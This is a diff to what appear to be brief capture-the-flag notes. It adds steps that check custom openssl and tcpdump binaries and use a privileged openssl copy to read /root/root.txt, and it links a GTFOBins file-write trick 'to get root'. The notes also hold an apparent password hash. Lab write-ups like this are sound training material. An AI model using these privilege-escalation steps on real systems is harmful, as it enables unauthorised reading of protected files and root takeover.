@@ -19,3 +19,17 @@ tcpdump -i lo not port 22 -w capture.pcap -v
 
 ##### If the host only knows the password as sha512, send it what looks like an md5 doesn’t make sense. plain text password
 8bc8251332abe1d7f105d3e53ad39ac2
+
+
+### Check md5sum custom binaries
+```bash
+md5sum openssl /usr/bin/openssl tcpdump /usr/sbin/tcpdump
+```
+
+### Root
+```bash
+/home/ldapuser1/openssl enc -in /root/root.txt
+
+# write to get root
+https://gtfobins.github.io/gtfobins/openssl/#file-write
+```
